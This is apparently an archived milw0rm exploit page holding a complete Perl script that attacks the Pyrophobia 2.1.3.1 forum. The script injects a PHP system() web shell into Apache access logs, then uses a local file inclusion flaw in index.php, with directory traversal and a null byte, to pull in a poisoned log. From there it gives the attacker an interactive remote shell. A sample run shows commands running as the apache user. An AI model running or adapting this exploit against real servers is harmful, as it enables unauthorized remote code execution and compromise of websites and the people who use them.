<html><head><title>Pyrophobia 2.1.3.1 LFI Command Execution Exploit</title></head><pre>#!/usr/bin/perl

# |----------------------------------------------------------------------------------------------------------------------------------|
# |                     INFORMATIONS                                                                                                 |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Web Application :  Pyrophobia 2.1.3.1                                                                                             |
# |Download        :  http://surfnet.dl.sourceforge.net/sourceforge/pyrophobia/pyro2_1_3_1.tar.gz                                    |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Remote Command Execution Exploit via Apache Log Injection                                                                         |
# |by Osirys                                                                                                                         |
# |osirys[at]autistici[dot]org                                                                                                       |
# |osirys.org                                                                                                                        |
# |Thx&amp;Greets to: evilsocket, Fireshot, Todd, str0ke                                                                                 |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |/[path]/index.php is affected to Local File Inclusion vulnerability:
# |[code]
# |&lt;?php
# |&lt;.... code ....&gt;
# |     if($_GET['pid']){ //if page id is set do custom content functions
# |             $pid=stripslashes($_GET['pid']);
# |             $pid=htmlspecialchars($pid);
# |             if ($pid=='') {
# |                  include('modules/index.php');
# |             } elseif (!file_exists('content/'.$pid.'.php')) {
# |                  include('modules/index.php');
# |             } else {
# |                  include('content/'.$pid.'.php');
# |             }
# |     }
# |&lt;.... code ....&gt;
# |[/code]
# |$pid comes from GET directly.
# |Works regardless of php.ini settings !
# |p0c : /[path]/index.php?pid=[lfi]%00

# ------------------------------------------------------------------
# Exploit in action [&gt;!]
# ------------------------------------------------------------------
# osirys[~]&gt;$ perl lfi.txt http://localhost/pyro2_1_3_1/
#
#   ---------------------------------
#      Pyrophobia Forum RCE Sploit
#               (Log Inj)
#               by Osirys
#   ---------------------------------
#
# [*] Injecting evil php code ..
# [*] Cheeking for Apache Logs ..
# [*] Apache Log Injection completed
# [*] Path: /var/log/httpd/access_log
# [!] Hi my master, do your job now [x]
#
# shell[localhost]$&gt; id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$&gt; pws
# bash: pws: command not found
# shell[localhost]$&gt; pwd
# /home/osirys/web/pyro2_1_3_1
# shell[localhost]$&gt; exit
# [-] Quitting ..
#
# osirys[~]&gt;$
# ------------------------------------------------------------------


use IO::Socket::INET;
use LWP::UserAgent;

my $host       =  $ARGV[0];
my $lfi_path   =  &quot;/index.php?pid=&quot;;
my $null_byte  =  &quot;%00&quot;;
my $rand_a     =  int(rand 150);
my $rand1      =  &quot;1337&quot;.$rand_a.&quot;1337&quot;;
my $rand_b     =  int(rand 150);
my $rand2      =  &quot;1337&quot;.$rand_b.&quot;1337&quot;;
my $gotcha     =  0;
my $dir_trasv  =  &quot;../../../../../../../../../..&quot;;
my @logs_dirs  =  qw(
                      /var/log/httpd/access_log
                      /var/log/httpd/access.log
                      /var/log/httpd/error.log
                      /var/log/httpd/error_log
                      /var/log/access_log
                      /logs/error.log
                      /logs/access.log
                      /var/log/apache/error_log
                      /var/log/apache/error.log
                      /etc/httpd/logs/access_log
                      /usr/local/apache/logs/error_log
                      /etc/httpd/logs/access.log
                      /etc/httpd/logs/error_log
                      /etc/httpd/logs/error.log
                      /usr/local/apache/logs/access_log
                      /usr/local/apache/logs/access.log
                      /var/www/logs/access_log
                      /var/www/logs/access.log
                      /var/log/apache/access_log
                      /var/log/apache/access.log
                      /var/log/access_log
                      /var/www/logs/error_log
                      /var/www/logs/error.log
                      /usr/local/apache/logs/error.log
                      /var/log/error_log
                      /apache/logs/error.log
                      /apache/logs/access.log
                    );

my $php_code   =  &quot;&lt;?php if(get_magic_quotes_gpc()){ \$_GET[cmd]=st&quot;.
                  &quot;ripslashes(\$_GET[cmd]);} system(\$_GET[cmd]);?&gt;&quot;;

($host) || help(&quot;-1&quot;);
cheek($host) == 1 || help(&quot;-2&quot;);
&amp;banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);


$sock = IO::Socket::INET-&gt;new(
                                PeerAddr =&gt; $h0st,
                                PeerPort =&gt; 80,
                                Proto =&gt; &quot;tcp&quot;
                             ) || die &quot;Can't connect to $host:80!\n&quot;;

print &quot;[*] Injecting evil php code ..\n&quot;;


print $sock &quot;GET /Osirys_log_inj start0&quot;.$rand1.$php_code.&quot;0end&quot;.$rand2.&quot; HTTP/1.1\r\n&quot;;
print $sock &quot;Host: &quot;.$host.&quot;\r\n&quot;;
print $sock &quot;Connection: close\r\n\r\n&quot;;
close($sock);

print &quot;[*] Cheeking for Apache Logs ..\n&quot;;

while (($log = &lt;@logs_dirs&gt;)&amp;&amp;($gotcha != 1)) {
    $tmp_path = $host.$lfi_path.$dir_trasv.$log.$null_byte;
    $re = get_req($tmp_path);
    if ($re =~ /Osirys_log_inj/) {
        $gotcha = 1;
        $log_path = $tmp_path;
        print &quot;[*] Apache Log Injection completed\n&quot;;
        print &quot;[*] Path: $log\n&quot;;
        print &quot;[!] Hi my master, do your job now [x]\n\n&quot;;
        &amp;exec_cmd;
    }
}

$gotcha == 1 || die &quot;[-] Couldn't find Apache Logs\n&quot;;

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print &quot;shell[$h0st]\$&gt; &quot;;
    $cmd = &lt;STDIN&gt;;
    $cmd !~ /exit/ || die &quot;[-] Quitting ..\n\n&quot;;
    $exec_url = $log_path.&quot;&amp;cmd=&quot;.$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ m/start0$rand1(.+)\*0end$rand2/g) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print &quot;$out\n&quot;;
        &amp;exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print &quot;bash: &quot;.$cmd.&quot;: command not found\n&quot;;
        $c &lt; 3 || die &quot;[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n&quot;;
        &amp;exec_cmd;
    }

}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $link);
    my $ua = LWP::UserAgent-&gt;new();
    $ua-&gt;timeout(4);
    my $response = $ua-&gt;request($req);
    return $response-&gt;content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st.&quot; &quot;.$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print &quot;\n&quot;.
          &quot;  --------------------------------- \n&quot;.
          &quot;     Pyrophobia Forum RCE Sploit   \n&quot;.
          &quot;              (Log Inj)             \n&quot;.
          &quot;              by Osirys             \n&quot;.
          &quot;  --------------------------------- \n\n&quot;;
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &amp;banner;
        print &quot;\n[-] Input data failed ! \n&quot;;
    }
    elsif ($error == -2) {
        &amp;banner;
        print &quot;\n[-] Bad hostname address !\n&quot;;
    }
    print &quot;[*] Usage : perl $0 http://hostname/cms_path\n\n&quot;;
    exit(0);
}

# milw0rm.com [2009-02-23]</pre></html>